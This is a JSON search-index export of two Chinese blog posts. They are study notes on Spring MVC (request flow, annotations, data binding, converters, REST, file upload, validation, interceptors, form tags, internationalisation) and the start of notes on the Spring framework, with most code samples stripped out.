[{"title":"Spring MVC","date":"2022-09-19T11:33:30.000Z","url":"/2022/09/19/Spring%20MVC/","categories":[[" ",""]],"content":"前言MVCMVC是什么？MVC模式，全程为Model-View-Controller(模型-视图-控制器)模式，他是一种软件架构模式，其目标是将软件的用户界面和业务逻辑分离，使代码具有更高的可扩展性、可复用性、可维护性以及灵活性。如下图所示： 各部分的作用如下： Model： 它是应用程序的主体部分，主要由以下 2 部分组成： 实体类 Bean：专门用来存储业务数据的对象，它们通常与数据库中的某个表对应，例如 User、Student 等； 业务处理 Bean：指 Service 或 Dao 的对象，专门用于处理业务逻辑、数据库访问。 一个模型可以为多个视图（View）提供数据，一套模型（Model）的代码只需写一次就可以被多个视图重用，有效地减少了代码的重复性，增加了代码的可复用性。 View： 指在应用程序中专门用来与浏览器进行交互，展示数据的资源。在 Web 应用中，View 就是我们常说的前台页面，通常由 HTML、JSP、CSS、JavaScript 等组成。 Controller： 通常指的是，应用程序的 Servlet。它负责将用户的请求交给模型（Model）层进行处理，并将 Model 层处理完成的数据，返回给视图（View）渲染并展示给用户。 在这个过程中，Controller 层不会做任何业务处理，它只是 View（视图）层和 Model （模型）层连接的枢纽，负责调度 View 层和 Model 层，将用户界面和业务逻辑合理的组织在一起，起粘合剂的效果。 MVC的工作流程 用户发送请求到服务器； 在服务器中，请求被Controller接收； Controller调用相应的Model层处理请求； Model层处理完毕将结果返回到Controller； Controlller再根据Model返回的请求处理结果，找到相应的View视图； View视图渲染数据最终响应给浏览器。 MVC的优点 降低代码耦合性： 在 MVC 模式中，三层之间相互独立，各司其职。一旦某一层的需求发生了变化，我们就只需要更改相应层中的代码即可，而不会对其他层中的代码造成影响。 有利于分工合作： 在 MVC 模式中，将应用系统划分成了三个不同的层次，可以更好地实现开发分工。例如，网页设计人员专注于视图（View）层的开发，而那些对业务熟悉的开发人员对 Model 层进行开发，其他对业务不熟悉的开发人员则可以对 Controller 层进行开发。 有利于组件的重用： 在 MVC 中，多个视图（View）可以共享同一个模型（Model），大大提高了系统中代码的可重用性。 Spring MVCSpring MVC（Spring Web MVC）是Spring框架提供的一款基于MVC模式的轻量级Web开发框架，是Spring为表示层(UI)开发提供的一套完备的解决方案。 Spring MVC 本质是对 Servlet 的进一步封装，其最核心的组件是 DispatcherServlet，它是 Spring MVC 的前端控制器，主要负责对请求和响应的统一地处理和分发。Controller 接收到的请求其实就是 DispatcherServlet 根据一定的规则分发给它的。 Spring MVC的常用组件： 组件 提供者 描述 DispatcherServlet 框架提供 前端控制器，它是整个 Spring MVC 流程控制中心，负责统一处理请求和响应，调用其他组件对用户请求进行处理。可以降低不同组件之间的耦合性。 HandlerMapping 框架提供 处理器映射器，根据请求的 url、method 等信息查找相应的 Handler。 Handler 开发人员提供 处理器，通常被称为 Controller（控制器），相当于Servlet。它可以在 DispatcherServlet 的控制下，对具体的用户请求进行处理。 HandlerAdapter 框架提供 处理器适配器，负责调用具体的控制器方法，对用户发来的请求来进行处理。Handler执行业务方法之前，需要进行一系列的操作包括表单的数据验证、数据类型的转换、将表单数据封装到POJO等，DispatcherServlet根据HandlerAdapter执行不同的Handler。 HandlerInterceptor 处理拦截器，是一个接口，通过实现该接口完成拦截处理。 HandlerExcutionChain 处理器执行链，包括Handler和HandlerInterceptor（系统有一个默认的HandlerInterceptor，如需要额外拦截处理，则添加拦截器）。 ModelAndView 封装了模型数据和视图信息，作为Handler的处理结果返回给DispatcherServlet。 ViewResolver 框架提供 视图解析器，其职责是对视图进行解析，得到相应的物理视图，将渲染的结果响应给客户端。常见的视图解析器有 ThymeleafViewResolver、InternalResourceViewResolver 等。 View 开发人员提供 视图，它作用是将模型（Model）数据通过页面展示给用户。 Spring MVC的工作流程 用户通过浏览器发起一个 HTTP 请求，该请求会被 DispatcherServlet（前端控制器）拦截； DispatcherServlet 调用 HandlerMapping（处理器映射器）找到具体的处理器（Handler）及拦截器，最后以 HandlerExecutionChain 执行链的形式返回给 DispatcherServlet。 DispatcherServlet 将执行链返回的 Handler 信息发送给 HandlerAdapter（处理器适配器）； HandlerAdapter 根据 Handler 信息找到并执行相应的 Handler（即 Controller 控制器）对请求进行处理； Handler 执行完毕后会返回给 HandlerAdapter 一个 ModelAndView 对象（Spring MVC 的底层对象，包括 Model 数据模型和 View 视图信息）； HandlerAdapter 接收到 ModelAndView 对象后，将其返回给 DispatcherServlet ； DispatcherServlet 接收到 ModelAndView 对象后，会请求 ViewResolver（视图解析器）对视图进行解析； ViewResolver 解析完成后，会将 View 视图并返回给 DispatcherServlet； DispatcherServlet 接收到具体的 View 视图后，进行视图渲染，将 Model 中的模型数据填充到 View 视图中的 request 域，生成最终的 View（视图）； 视图负责将结果显示到浏览器（客户端）。 Spring MVC的简单使用创建Maven工程，Archetype选择org.apache.maven.archetypes:maven-archetype-webapp；导入依赖： 部署Tomcat； 在web.xml中配置 DispatcherServlet； 配置文件，&#x3D;&#x3D;springmvc.xml&#x3D;&#x3D; 创建Handler： 流程梳理： DispatcherServlet接收到URL请求/index，结合@RequestMapping(&quot;/index&quot;)注解将该请求交给index业务方法进行处理； 执行index业务代码，控制台打印日志，并返回1111字符串（逻辑视图）； 结合springmvc.xml中的视图解析器配置，找到目标资源/index.jsp，将该JSP资源返回给客户完成响应。 Spring MVC常用注解 @Controller该注解可以将一个普通的Java类标识成控制器(Controller)类。 Spring MVC 是通过组件扫描机制查找应用中的控制器类的，为了保证控制器能够被 Spring MVC 扫描到，我们还需要在 Spring MVC 的配置文件中使用 &lt;context:component-scan/&gt; 标签，指定控制器类的基本包（请确保所有控制器类都在基本包及其子包下），示例代码如下。 标注到控制器类上时，value属性值就是整个控制器类中所有控制器方法URL地址的父路径；访问该Controller下的任意控制器方法都需要带上整个路径，即/springmvc/login。 属性介绍： &#x3D;&#x3D;value&#x3D;&#x3D;value属性用来设置控制器方法的请求映射地址，值设置value属性时，value可省略；value是一个字符串类型的数组，一个value可以匹配多个请求地址；@RequestMapping(value = &#123;&quot;/register&quot;, &quot;/login&quot;&#125;) &#x3D;&#x3D;name&#x3D;&#x3D;相当于方法的注释，用于解释整个方法时用来干什么的；@RequestMapping(value = &quot;/login&quot;,name = &quot;用户登录&quot;) method用来设置控制器方法支持的请求方法，如果没有设置method属性，则表示该方法支持全部请求类型。RequestMethod是一个枚举类型，包含如下请求方式： 一个mtehod也可以设置多种请求方法；@RequestMapping(value = &quot;/toUser&quot;,method = &#123;RequestMethod.GET,RequestMethod.POST&#125;) &#x3D;&#x3D;params&#x3D;&#x3D;用于指定请求中的参数，只有当请求中携带了符合条件的参数时，控制器方法才会对该请求进行处理。通过以下四种表达式对请求的参数进行配置： “param” 请求中必须携带名为 param 的参数 “!param” 与上一个表达式的含义完全相反，请求中不能携带名为 param 的参数 “param&#x3D;value” 请求中必须携带名为 param 的参数，且参数的取值必须为：value “param!&#x3D;value” 与上一个表达式的含义完全相反，请求中不能携带参数：param &#x3D; value。 @RequestMapping(value = &quot;/testParam&quot;, params = &#123;&quot;name=admin&quot;, &quot;id=1&quot;&#125;) 只有当请求中同时携带name和id两个请求参数，且值必须为admin和1，控制器方法才会对该请求进行处理。 &#x3D;&#x3D;headers&#x3D;&#x3D;用于设置请求头信息，只有当请求中携带指定的请求头信息时，控制器方法才会处理该请求。通过以四种表达式来指定请求中的请求头信息：- “header” 请求必须携带请求头信息：header “!header” 与上一个表达式的含义完全相反，请求中不能携带请求头信息：header “header&#x3D;value” 请求中必须携带请求头信息：header&#x3D;value 。 “header!&#x3D;value” 与上一个表达式的含义完全相反，请求中不能携带请求头信息：header&#x3D;value。 @RequestMapping(value = &quot;toUser&quot;,headers = &quot;Referer=;)只有当请求头信息中包含Referer=时，该控制器方法才会处理该请求。 @CookieValuecookie映射，通过该注解来获取当前那cookie； 参数绑定@RequestParam在业务方法定义时声明参数列表，通过@RequestParam注解，将username绑定到name参数，num绑定到id参数，这样就在请求中通过usernme和num对name和id赋值。 其中，URL接收的参数值是String类型，由HandlerAdapter 将参数值转换为对应的类型传递给方法。 @PathVariableSpring MVC也支持RESTful风格的URL参数获取，通过@PathVariable注解来绑定参数，URL中以/username值/num值的形式来传入参数，要注意参数值顺序对应。 使用POJO绑定参数Spring MVC会根据请求参数名和POJO属性名进行匹配，自动为该对象填充属性值，并且支持属性级联。 导入Lombok依赖； 在web.xml中添加UTF-8编码的过滤器，要添加到servlet配置前面； &#x3D;&#x3D;addUser.jsp&#x3D;&#x3D;，属性名要与User类中的一致； 接收到客户端传入的数据后，HandlerAdapter找到对应的业务方法/add，发现需要User参数，就把客户端传入的数据封装成User对象传入。 User中也可以包含引用类型的属性，就称为级联。User类可以没有无参构造，但是级联类必须有无参构造。 JSP页面的转发和重定向Spring MVC默认以转发的形式响应JSP：return &quot;forward:/index.jsp&quot;;，如果是像上面示例一样在配置文件中加了前后缀的话，就可以写成return &quot;index&quot;;； 可以手动设置为重定向：return &quot;redirect:/index.jsp&quot;；设置重定向地址时，不能写逻辑路径，必须写明物理路径，这种写法是错误的return &quot;redirect:index&quot;; Spring MVC数据绑定数据绑定： 在后台业务方法中，直接获取前端HTTP请求中的参数。 HTTP请求传输的参数都是String类型的，Handler业务方法中的参数是开发者指定的数据类型，因此需要进行数据类型的转换。 Spring MVC的HandlerAdapter组件会在执行Handler业务方法之前，完成参数绑定，开发者直接使用即可。 @ResponseBody注解的作用是将方法的返回值以特定的格式写入到response的body区域，进而将数据返回给客户端。 基本数据类型 这里就是返回的我们自定义的格式，如果不加@ResponseBody注解，就会按照视图解析器的规则，给返回的内容添加前后缀，导致返回错误； 使用了@ResponseBody注解，传入的参数不能为空，否则会报错； 并且传入的值必须能够转换为对应类型，否则会报错。 包装类 id设置为Integer类型的话id不传值不会报错，传其他还是会报错。 @RequestParam注解可以设置参数是否必须，required属性为true时表示必须，为false表示非必须；defaultValue 属性表示不传值时id的默认值，必须写成字符串形式； 数组类型 在springmvc.xml中添加转换器解决中文乱码问题； List类型&#x3D;&#x3D;UserList.java&#x3D;&#x3D; &#x3D;&#x3D;addList.jsp&#x3D;&#x3D; JSON类型下载jquery-3.6.0.min.js，放到/webapp/js目录下，rebuild一下，在jsp中引入jquery； web.xml中添加： pom.xml中添加FastJson依赖，jar包下载：  在上面写的springmvc.xml的转换器中添加bean： &lt;bean class=&quot;com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter&quot;&gt;&lt;/bean&gt; &#x3D;&#x3D;json.jsp&#x3D;&#x3D; @RequestBody读取HTTP请求参数，通过Spring MVC提供的HttpMessageConverter接口将读取的参数转为JSON、XML格式的数据，绑定到业务方法的形参。@ResponseBody将业务方法返回的对象，提供HttpMessageConverter接口转为指定格式的数据，JSON、XML等，响应给客户端。 @RequestBody结合FastJson将JSON转换为Java Bean，好处在于如果属性为空，就不会将其转换为JSON json.jsp传入数据到/Spring_MVCTest1/jsonType，Handler中将数据转换为User对象，返回给json.jsp以JSON格式输出。 Spring MVC域对象共享数据 + 视图层解析在 Spring MVC 中，控制器在接收到 DispatcherServlet 分发过来的请求后，会继续调用 Model 层对请求进行处理。Model 层处理完请求后的结果被称为模型数据，会将模型数据返回给 Controller。Controller 在接收到 Model 层返回的模型数据后，下一步就是将模型数据通过域对象共享的方式传递给 View 视图进行渲染，最终返回给客户端展示。 域对象是服务器在内存上创建的一块存储空间，主要用不同动态资源之间的数据传递和数据共享。在 Spring MVC 中，常用的域对象有 request 域对象、session 域对象、application 域对象等（page域对象只在当前页面有效，实用性不高）。 业务数据的绑定是指将业务数据绑定给JSP域对象，业务数据的绑定是由ViewResolver来完成的，开发时，先添加业务数据，在交给ViewResolver来绑定，重点就在于如何添加业务数据。 常用域对象共享数据的方式如下： 向request域对象中共享数据1. 使用Servlet APISpring MVC可以在业务方法中直接获取Servlet原生Web资源，只需要在方法定义时 HttpServletRequest 入参即可，在方法体中直接使用request对象。 由于这种方式是通过原生 Servlet API 实现的，会导致控制器与 Servlet 容器耦合度过高，因此通常情况下，不推荐使用这种方式向 request 域对象中共享数据。 2. 使用 MapSpring MVC在调用业务方法之前会创建一个隐含对象作为业务数据的存储容器，设置业务方法的入参为Map类型，Spring MVC 会将给隐含对象的引用传递给入参。 3. 使用 Model与Map类似，业务方法通过入参来完成业务数据的绑定。 4. 使用 ModelAndViewModelAndView 即包含业务数据，同时也封装了视图信息，如果使用ModelAndView来处理业务数据，业务方法的返回值必须是ModelAndView对象。 ModelAndView 其中的model负责数据共享，view注意用于设置视图，实现页面跳转。常用方法： 添加模型数据，填充业务数据：ModelAndView addObject(String attributeName, @Nullable Object attributeValue)ModelAndView addObject(Object attributeValue) 设置视图，绑定视图信息：void setViewName(@Nullable String viewName) void setView(@Nullable View view) 在 Controller 类中，ModelAndView 只有在作为控制器方法的返回值，返回给前端控制器（DispatcherServlet）时，前端控制器解析才会去解析它。 或者： 或者： 或者： 或者： ModelAndView类有八种带参构造，大意都差不多，自行了解。 5. 使用 ModelMap 6. 使用@ModelAttribute注解定义一个方法存放要填充的数据，给该方法添加@ModelAttribute注解。 &#x3D;&#x3D;@ModelAttribute&#x3D;&#x3D;的作用是，当Handler接收到一个客户端请求之后，无论需要调用哪个业务方法，都会先调用@ModelAttribute标注的方法，并将其返回值作为业务数据，再进入到业务方法，此时业务方法只需要返回视图即可，即使对数据做出修改，数据也不会被覆盖，仍然输出@ModelAttribute方法返回的数据。 如果@ModelAttribute标注的方法存入了数据，但是返回的是void，同样也可以拿到数据； 如果同时使用@ModelAttribute标注的两个方法对同一个对象传值，直接给Model对象进行装载的优先级更高。 与上面的getUser()相比，返回的数据应该是李四。 向 session 域对象中共享数据**1. 使用 Servlet API ** 2. 使用@SessionAttributes@SessionAttributes使用在Handler类上面;业务方法默认向request域对象中共享数据，如下代码，表示将user1和user2属性共享到session域对象中（request域对象默认共享），只要业务方法中存在这两个key的数据，就会添加到session中。 向 application 域对象中共享数据使用 Servlet API通过HttpSession类型的形参获取到application域对象，如何将数据共享到application域对象中。 Spring MVC类型转换器（Converter）Spring 提供了一种 Converter（类型转换器）的类型转换工具。在 Spring MVC 中，它的作用是在控制器方法对请求进行处理前，先获取到请求发送过来的参数，并将其转换为控制器方法指定的数据类型，然后再将转换后的参数值传递给控制器方法的形参，这样后台的控制器方法就可以正确地获取请求中携带的参数了。 内置转换器1. 标量转换器 2. 集合、数组相关转换器 Spring MVC 对于基本类型（例如 int、long、float、double、boolean 以及 char 等）已经做好了基本类型转换。其他类型的转换可以自定义转换器。 注意：在使用内置类型转换器时，请求参数输入值需要与接收参数类型相兼容，否则会报 400 错误。 自定义类型转换器org.springframework.core.convert.converter包中定义了3中类型的转换器接口： 接口 说明 Converter&lt;S,T&gt; 该接口使用了泛型，第一个类型 S 表示原类型，第二个类型 T 表示目标类型，里面定义了一个 convert() 方法，能够将原类型对象作为参数传入，进行转换之后返回目标类型对象。 ConverterFactory 如果我们希望将一种类型的对象转换为另一种类型及其子类对象，例如将 String 转换为 Number 以及 Number 的子类 Integer、Double 等类型的对象，那么就需要一系列的 Converter，如 StringToInteger、StringToDouble 等。ConverterFactory&lt;S,R&gt; 接口的作用就是将这些相同系列的多个 Converter 封装在一起。 GenericConverter 该接口会根据源类对象及目标类对象的上下文信息进行类型转换。 要自定义类型转换器只需实现其中一个接口就可以了。 String类型转Date类型的转换器实现org.springframework.core.convert.converter.Converter接口；定义一个转换器： 在配置文件springmv.xml中声明一个 org.springframework.context.support.ConversionServiceFactoryBean的 Bean（例如示例配置中的名为conversionService的 Bean），然后通过其 converters 属性将自定义的所有类型转换器注册到其中；显示的装配自定义类型转换器是为了将默认注册的FormattingConversionServiceFactoryBean类型的conversionService覆盖掉。 &#x3D;&#x3D;补充：&#x3D;&#x3D; &#x3D;&#x3D;ConverterHandler.java&#x3D;&#x3D; &#x3D;&#x3D;date.jsp&#x3D;&#x3D; 运行结果： 程序运行时，第一次输入的参数会先进入转换器的构造方法方法中，然后再进入convert方法，最后到达Handler中；第二次输入参数时，会直接进convert方法，再进入Handler。 String类型转Student类型的转换器再springmvc.xml中的自定义类型转换器配置中添加bean：&lt;bean class=&quot;Converter.StudentConverter&quot;&gt;&lt;/bean&gt; &#x3D;&#x3D;Student.java&#x3D;&#x3D; &#x3D;&#x3D;student.jsp&#x3D;&#x3D; 转换器，&#x3D;&#x3D;StudentConverter.jsva&#x3D;&#x3D; Handler： 运行结果： Spring MVC 实现RESTfulRESTful（REST 风格）是一种当前比较流行的互联网软件架构模式，它充分并正确地利用 HTTP 协议的特性，为我们规定了一套统一的资源获取方式，以实现不同终端之间（客户端与服务端）的数据访问与交互。 什么是RESTResource Representational State Transfer 的缩写，译为“资源表述状态转移”。 Resource（资源）指网络中的某个具体文件，可以是一个类、一个 HTML 文件、一个 CSS 文件、一个 JS 文件、数据库中的一张表、一段文本、一张图片、一段音频等等，是网络中真实存在的一个实体。这些资源都有一个共同的特征，那就是它们都可以通过一个 URI（统一资源标识符） 进行标识，任何对于该资源的操作都不能改变其 URI。想要获取这个资源，只要访问它的 URI 即可。 Representation（资源的表述）指是资源在某个特定时刻的状态的描述，即资源的具体表现形式，它可以有多种格式，例如 HTML、XML、JSON、纯文本、图片、视频、音频等等。通常情况下，服务端与客户端资源的表述所有使用的格式往往是不同的，例如在服务端资源可能是数据库中的一段纯文本、一个 XML 文件、或者是数据库中的一张表，而客户端则可能是表现为 HTML 页面、JSON、甚至是音频和视频。 State Transfer（状态转移）客户端与服务端进行交互时，资源从一种表现形式转换到另一种表现形式的过程。但是 HTTP 协议是一种无状态协议，它是无法保存任何状态的，因此如果客户端想要获取服务器上的某个资源，就必须通过某种手段让资源在服务器端发生“状态转化”，而这种状态转化又是建立在应用的表现层（UI）上的。这就是“表现层资源状态转移”的含义。 RESTfulRESTful的特点： URL传参更简洁，不需要写参数名，允许通过/将参数值拼接到URL中； 传统URL形式： RESTful形式： 提供了一套规范来完成不同终端之间的资源共享；四种与资源相关的基本操作： GET 用来获取资源， POST 用来新建资源， PUT 用来更新资源， DELETE 用来删除资源。客户端通过这四种请求方式，即可实现对服务器端资源状态转移的描述。 实现RESTful1. 通过@RequestMapping +@PathVariable 注解的方式这种方式前面提到过，使用这两个注解来对参数进行绑定； 2. 通过 HiddenHttpMethodFilter 对请求进行过滤在传统Web开发中，form 只支持 GET 和 POST 请求方式，不支持 PUT 和 DELETE 请求方式，现在可以通过 Spring MVC 提供的 HiddenHttpMethodFilter 过滤器将 POST 请求转为 PUT 和 DELETE 请求。 过滤器的实现原理是：检测请求参数中是否包含_method参数，如果包含，则取出它的值，根据值转换为相应的请求类型，然后将请求进行传递给服务器。 实现步骤： 在web.xml中配置HiddenHttpMethodFilter； 在 form 表单中添加隐藏标签，name 为_method，value 为 PUT &#x2F; DELETE； 定义Handler。 示例实现课程的增、删、改、查。 web.xml配置过滤器； pom.xml添加JSTL依赖； 注意修改springmvc.xml中自动扫描配置所扫描的包名，要能扫描到我们使用的所有类，我这里修改成父包springmvc；&lt;context:component-scan base-package=&quot;springmvc&quot;&gt;&lt;/context:component-scan&gt; &#x3D;&#x3D;CourseRepository.java&#x3D;&#x3D; &#x3D;&#x3D;CourseHandler.java&#x3D;&#x3D; &#x3D;&#x3D;index.jsp&#x3D;&#x3D; &#x3D;&#x3D;save.jsp&#x3D;&#x3D; &#x3D;&#x3D;edit.jsp&#x3D;&#x3D; 运行结果： Spring MVC 实现文件的上传、下载单文件上传底层使用的是Apache Commons-FileUpload 组件实现上传功能，Spring MVC只是对其进行了封装，简化开发。pom.xml中导入依赖： 在web.xml中添加如下配置，使用默认方法加载png、jpg等类型图片，否则加载不出来。 在springmvc.xml中定义文件上传解析器：&lt;bean id=&quot;multipartResolver&quot; class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;&lt;/bean&gt; CommonsMultipartResolver实现了MultipartResolver接口，该接口用于处理文件上传；当收到请求时，DispatcherServlet 的 checkMultipart() 方法会调用 MultipartResolver 的 isMultipart() 方法判断请求中是否包含文件；如果请求数据中包含文件，则调用 MultipartResolver 的 resolveMultipart() 方法对请求的数据进行解析，然后将文件数据解析成 MultipartFile 并封装在 MultipartHttpServletRequest (继承了 HttpServletRequest) 对象中，最后传递给 Controller。 MultipartFile 封装了请求数据中的文件，此时这个文件存储在内存中或临时的磁盘文件中，需要将其转存到一个合适的位置，因为请求结束后临时存储将被清空。MultipartFile 接口中包含那多种获取文件信息的方法。 &#x3D;&#x3D;upload.jsp&#x3D;&#x3D; &#x3D;&#x3D;FileHandler.java&#x3D;&#x3D; 程序中获取到的path是本工程在Tomcat下的路径，不是工程创建的路径； 保存路径的src与 Configurations 中设置的 Application context 有关，在该目录下创建/file文件夹； 图片上传结果： 多文件上传多文件上传其实就是在单文件上传的基础上加个 for 循环。 &#x3D;&#x3D;uploads.jsp&#x3D;&#x3D; Handler业务方法： 运行结果： 文件下载在JSP中添加超链接，点击超链接进行下载。 &#x3D;&#x3D;download.jsp&#x3D;&#x3D; Handler中的业务方法： 先将图片上传上去，再下载，运行结果： Spring MVC 数据校验Spring MVC 提供了两种数据校验的组件： 基于 Validator 接口 使用 Annotation JSR-303标准校验 使用基于 Validator 接口进行校验会复杂一些，具体的数据校验的规则需要开发者手动设置。使用 Annotation JSR-303标准会相对简单一堆，开发者不需要编写校验规则，直接通过注解的形式给每一条数据添加验证规则，具体操作是直接在实体类的属性上添加对应的校验注解即可。 基于 Validator 接口定义一个实体类； 自定义数据校验器 PersonValidation，实现org.springframework.validation.Validator接口，重写抽象方法，加入校验规则； Handler业务方法： 在springmvc.xml中配置数据校验器； &#x3D;&#x3D;login.jsp&#x3D;&#x3D; 先到/Spring_MVCTest1/validate/login进行数据绑定，如果校验失败则会出现提示信息，校验成功则跳转。 程序运行流程：访问/Spring_MVCTest1/validate/login，会先到 Handler 的login方法中绑定 Person 对象； 然后到校验器的supports方法中判断绑定对象是否是 Person 类； 接着到validate方法中进行校验，如果传入的是空，errors中则会存储错误信息，这里分别存到name和pwd中； 最后到 Handler 中判断校验是否出错，bindingResult中存的就是 errors 的错误信息，if 为真，返回login.jsp，如果没有错误信息就返回success.jsp； 前端login.jsp中的&lt;form:errors&gt;标签，就会根据 path 的值输出对应的错误信息内容。 Annotation JSR-303标准校验JSR-303 是 Java EE 6 中的一项子规范，叫做 Bean Validation，官方参考实现是hibernate Validator，通过注解完成校验规则的绑定。 pom.xml中导入如下依赖： 定义一个实例类： 业务方法： 在springmvc.xml中添加配置（把基于 Validator 接口的配置注释掉）；&lt;mvc:annotation-driven&gt;&lt;/mvc:annotation-driven&gt; &#x3D;&#x3D;register.jsp&#x3D;&#x3D; 运行结果： Spring MVC拦截器拦截器（Interceptor）是 Spring MVC 提供的一种强大的功能组件。它可以对用户请求进行拦截，并在请求进入控制器（Controller）之前、控制器处理完请求后、甚至是渲染视图后，执行一些指定的操作。 在 Spring MVC 中，拦截器的作用与 Servlet 中的过滤器类似，它主要用于拦截用户请求并做相应的处理，例如通过拦截器，我们可以执行权限验证、记录请求信息日志、判断用户是否已登录等操作。 Spring MVC 拦截器使用的是可插拔式的设计，如果我们需要某一拦截器，只需在配置文件中启用该拦截器即可；如果不需要这个拦截器，则只要在配置文件中取消应用该拦截器即可。 验证登录身份示例登录页面，&#x3D;&#x3D;login.jsp&#x3D;&#x3D; 登录成功显示页面，&#x3D;&#x3D;success.jsp&#x3D;&#x3D; Handler： Spring MVC 在org.springframework.web.servlet包中提供了一个 HandlerInterceptor 接口，该接口包含 3 个方法： 方法名 返回值 说明 preHandle () boolean 该方法在控制器方法之前执行，其返回值用来表示是否中断后续操作。返回值为 true 时，表示继续向下执行；返回值为 false 时，表示中断后续的操作。 postHandle (） void 该方法会在控制器方法调用之后，解析式图之前执行。我们可以通过此方法对请求域中的模型（Model）数据和视图做出进一步的修改。 afterCompletion () void 该方法会在整个请求完成后，即视图渲染结束之后执行。我们可以通过该方法实现资源清理、日志记录等工作。 定义拦截器： 在springmvc.xml中通过&lt;mvc:interceptors&gt;标签配置拦截器； 当直接访问/Spring_MVCTest1/interceptor/main会被拦截器拦截，验证是否登录，未登录返回错误信息；正确登录就跳转到success.jsp。 Spring MVC 表单标签库使用 Spring MVC 表单标签库可以直接将业务数据绑定到JSP表单中，简化了JSP页面的代码编写。 简单使用需要在JSP页面中导入Spring MVC 表单标签库；&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;; %&gt; 通过 modelAttribute 属性将 form 表单与业务数据进行绑定， 属性值设为Handler中向 model 对象存值时的 name。 示例，使用&lt;form:input&gt;标签进行输入操作： 等价于下面的代码，显然使用表单标签库简洁许多。 Handler： 常用标签 form 标签&lt;form:form modelAttribute=&quot;student&quot; method=&quot;post&quot;&gt;&lt;/form:form&gt;渲染的时 HTML 中的&lt;form&gt;&lt;/form&gt;，通过 modelAttribute 属性绑定具体的业务数据。 input 标签&lt;form:input path=&quot;id&quot;&gt;&lt;/form:input&gt;渲染的时 HTML 中的&lt;input type=&quot;text&quot; name=&quot;id&quot;/&gt;，通过 path 属性与业务数据的属性名对应，支持级联。 password 标签&lt;form:password path=&quot;password&quot;&gt;&lt;/form:password&gt;渲染的是 HTML 中的&lt;input type=&quot;password&quot; /&gt;，通过 path 与页数数据的属性名对应，该标签的值不会在页面显示（空白的）。 checkbox 标签&lt;form:chexkbox path=&quot;hobby&quot; value=&quot;读书&quot;&gt;读书&lt;/form:chexkbox&gt;渲染的是 HTML 中的&lt;input type=&quot;checkbox&quot; /&gt;，通过 path 与业务数据的属性名对应，可以绑定Boolean、数据和集合；如果绑定Boolean类型的遍历，该变量值为 true，表示选中，为 false 表示不选中； 如果绑定数组和集合类型，集合中的元素等于 checkbox 的 value 值，则表示选中该选项，否则为不选中。 checkboxs 标签&lt;form:checkboxs items=&quot;$&#123;student.hobby&#125;&quot; path=&quot;selectHobby&quot;&gt;&lt;/form:checkboxs&gt;渲染的是 HTML 中的&lt;input type=&quot;checkbox&quot;/&gt;，需要结合 items 和path 两个属性来使用；items 绑定被遍历的数组或集合，path 绑定选中的集合或数组，items 是全部选项，要用EL表达式， path 为默认选中的选项。 radiobuttton 标签&lt;form:radiobutton path=&quot;radioId&quot; value=&quot;0&quot;&gt;&lt;/form:radiobutton&gt;渲染的是 HTML 中的&lt;input type=&quot;radio&quot;/&gt; ，绑定的数据与标签的 value 值相等则为选中状态，反之为不选中。 radiobutttons 标签&lt;form:radiobutttons items=&quot;$&#123;student.grade&#125;&quot; path=&quot;selectSex&quot;&gt;&lt;/form:radiobutttons&gt;渲染的是 HTML 中的&lt;input type=&quot;radio&quot; /&gt;，需要结合 items 和path 两个属性来使用；items 绑定被遍历的数组或集合，path 绑定选中的值。与 checkboxs 类似，不过 path 为单选。 select 标签&lt;form:select items=&quot;$&#123;student.cities&#125;&quot; path=&quot;selectcity&quot;&gt;&lt;/form:select&gt;渲染的是 HTML 中的&lt;select&gt;标签，与 radiobutttons 用法一致。 option 标签 path 与 value 相等的选项默认选中。 options 标签 items 中的 path 选项默认选中，与 select 标签效果一致。 Spring MVC 国际化国际化是指同一个应用程序在不同语言设置的浏览器中，自动显示相应的语言，Spring MVC 对国际化做了很好的集成，只需要简单配置即可实现国际化。 在springmvc.xml中添加如下配置： 其中： ReloadableResourceBundleMessageSource：对资源文件中设置的内容进行绑定； LocaleChangeInterceptor：用于获取请求中的国际化信息并将其转换为 Locale 对象，以获取 LocaleResolver 对象对国际化资源文件进行解析； SessionLocaleResolver：将将包含了国际化信息的 Locale 对象存储在 Session 中，供后续页面继续使用。 在resource目录下创建国际化资源文件，文件名格式为：基本名_语言代码_国家或地区代码：&#x3D;&#x3D;language_en_US.properties&#x3D;&#x3D; 得用Unicode编码，不然会乱码，&#x3D;&#x3D;language_zh_CN.properties&#x3D;&#x3D; 默认是英文页面，通过URL中lang参数来改变语言，运行结果："},{"title":"Spring学习笔记","date":"2022-09-19T11:32:30.000Z","url":"/2022/09/19/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","categories":[[" ",""]],"content":"概述Spring是一个企业级的开发框架，是软件设计层面的框架，是一种基于Bean的编程技术，使很多复杂的代码变得优雅和简洁。 在实际开发中，服务器端应用程序通常采用三层体系架构，分别为表现层（web）、业务逻辑层（service）、持久层（dao）。 在表现层提供了对 Spring MVC、Struts2 等框架的整合； 在业务逻辑层提供了管理事务和记录日志的功能； 在持久层还可以整合 MyBatis、Hibernate 和 JdbcTemplate 等技术，对数据库进行访问。 Spring Framework的特点： 方便解耦，简化开发 方便集成各种优秀框架 降低Java EE API的使用难度 方便程序的测试 AOP编程的支持 声明式事务的支持 Spring有两个核心的部分：IoC和AOP。IoC： Inverse of Control ，译为“控制反转”，指把创建对象过程交给 Spring 进行管理。AOP： Aspect Oriented Programming ，译为“面向切面编程”。AOP 用来封装多个类的公共行为，将那些与业务无关，却为业务模块所共同调用的逻辑封装起来，减少系统的重复代码，降低模块间的耦合度。另外，AOP 还解决一些系统层面上的问题，比如日志、事务、权限等。 Bean定义由 Spring IoC 容器管理的对象称为 Bean，Bean 是根据 Spring 配置文件中的信息创建。 Spring 配置文件支持两种格式，即 XML 文件格式和 Properties 文件格式： Properties 配置文件主要以 key-value 键值对的形式存在，只能赋值，不能进行其他操作，适用于简单的属性配置。 XML 配置文件采用树形结构，结构清晰，相较于 Properties 文件更加灵活。但是 XML 配置比较繁琐，适用于大型的复杂的项目。 通常使用XML格式。 &lt;beans&gt;标签下常用的属性有： id：Bean的唯一标识符； name：Bean的名称，可以通过name属性为同一个Bean同时指定多个名称，用逗号分隔； class，指定Bean的实现类，必须使用全类名； scope：表示Bean的作用域； constructor-arg：&lt;bean&gt;的子元素，传入构造参数； property，&lt;bean&gt;元素的子元素，用于调用 Bean 实例中的 setter 方法对属性进行赋值，从而完成属性的注入。 